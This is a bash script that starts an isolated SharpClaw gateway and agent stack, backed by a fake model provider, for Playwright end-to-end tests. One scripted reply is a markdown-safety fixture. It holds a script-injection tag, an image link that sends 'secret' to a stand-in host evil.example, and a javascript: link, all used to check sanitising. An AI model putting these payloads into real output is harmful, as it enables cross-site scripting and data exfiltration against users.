#!/usr/bin/env bash
# Starts an isolated SharpClaw stack for the Playwright suite: the gateway (fake provider, built UI)
# and one agent process, on spare ports with a throwaway database. It never touches a running
# Compose stack. Usage: e2e/stack.sh start|stop. State lives in $E2E_STATE_DIR.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
STATE="${E2E_STATE_DIR:-${TMPDIR:-/tmp}/sharpclaw-e2e}"
CLIENT_PORT="${E2E_CLIENT_PORT:-18480}"
AGENT_PORT="${E2E_AGENT_PORT:-18481}"
ADMIN_KEY="e2e-admin-key"
BASE="http://127.0.0.1:$CLIENT_PORT"

stop() {
  for pidfile in "$STATE"/*.pid; do
    [ -f "$pidfile" ] || continue
    kill "$(cat "$pidfile")" 2>/dev/null || true
    rm -f "$pidfile"
  done
}

if [ "${1:-}" = "stop" ]; then
  stop
  exit 0
fi

stop
rm -rf "$STATE"
mkdir -p "$STATE/config" "$STATE/workspace/notes"

dotnet build "$ROOT/src/SharpClaw.Gateway" -c Release -v quiet -nologo >/dev/null
dotnet build "$ROOT/src/SharpClaw.Agent" -c Release -v quiet -nologo >/dev/null
dotnet build "$ROOT/src/SharpClaw.Cli" -c Release -v quiet -nologo >/dev/null

# Scripted replies: streaming, tool use needing approval, markdown safety, a long reply.
cat >"$STATE/script.json" <<'JSON'
{
  "rules": [
    { "match": "^delete the note", "role": "user", "response": "Deleting it.", "toolCalls": [
      { "name": "workspace_delete", "arguments": { "path": "notes/old.md" } } ] },
    { "match": ".*", "role": "tool", "response": "The tool step is finished." },
    { "match": "^slow", "response": "This reply streams slowly so a reload can land in the middle of it, and the rest should continue without any duplication at all. The end.", "chunkSize": 4, "delayMs": 120 },
    { "match": "^markdown", "response": "**bold** <script>window.__pwned = 1</script> ![leak](https://evil.example/leak.png?d=secret) [bad](javascript:alert(1)) [ok](https://example.com)" },
    { "match": ".*", "response": "Hello from the fake provider.", "chunkSize": 6, "delayMs": 30 }
  ]
}
JSON

# Anything above low risk needs approval; no smart mode (it would cost an extra model call).
cat >"$STATE/config/agent.json" <<'JSON'
{ "allowedRiskLevel": "low", "smartMode": false, "maxToolIterations": 5,
  "tools": ["workspace_list", "workspace_read", "workspace_write", "workspace_delete"] }
JSON
printf 'You are a test agent.\n' >"$STATE/config/soul.md"
printf 'old note\n' >"$STATE/workspace/notes/old.md"

GATEWAY_DLL="$ROOT/src/SharpClaw.Gateway/bin/Release/net10.0/SharpClaw.Gateway.dll"
(
  cd "$STATE"
  Auth__AdminKey="$ADMIN_KEY" Provider__Type=Fake Fake__ScriptPath="$STATE/script.json" \
  Database__Path="$STATE/sharpclaw.db" Listeners__ClientPort="$CLIENT_PORT" Listeners__AgentPort="$AGENT_PORT" \
  Ui__RootPath="$ROOT/ui/dist" Approvals__TimeoutSeconds="${E2E_APPROVAL_TIMEOUT:-25}" Approvals__SweepIntervalSeconds=1 \
  Context__ReplyReserveTokens=100 Logging__LogLevel__Default=Warning \
    exec dotnet "$GATEWAY_DLL" >"$STATE/gateway.log" 2>&1
) &
echo $! >"$STATE/gateway.pid"

for _ in $(seq 1 60); do
  curl -fsS "$BASE/healthz" >/dev/null 2>&1 && break
  sleep 0.5
done
curl -fsS "$BASE/healthz" >/dev/null

# The first user, created with the CLI as the README describes.
CLI_DLL="$ROOT/src/SharpClaw.Cli/bin/Release/net10.0/sharpclaw.dll"
printf '%s\n' "${E2E_PASSWORD:-e2e password 1234}" | SHARPCLAW_URL="$BASE" SHARPCLAW_ADMIN_KEY="$ADMIN_KEY" \
  dotnet "$CLI_DLL" users create "${E2E_USER:-kevin}" --password-stdin >/dev/null

TOKEN=$(curl -fsS -X POST "$BASE/api/agents" -H "Authorization: Bearer $ADMIN_KEY" -H 'Content-Type: application/json' \
  -d '{"name":"assistant","model":"fake/model","dailyBudgetUsd":5}' | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).token.value))')

(
  GATEWAY_URL="http://127.0.0.1:$AGENT_PORT" AGENT_TOKEN="$TOKEN" SOUL_PATH="$STATE/config/soul.md" \
  WORKSPACE_PATH="$STATE/workspace" AGENT_CONFIG_PATH="$STATE/config/agent.json" LONG_POLL_SECONDS=5 LOG_LEVEL=Warning \
    exec dotnet "$ROOT/src/SharpClaw.Agent/bin/Release/net10.0/SharpClaw.Agent.dll" >"$STATE/agent.log" 2>&1
) &
echo $! >"$STATE/agent.pid"

echo "stack ready on $BASE"
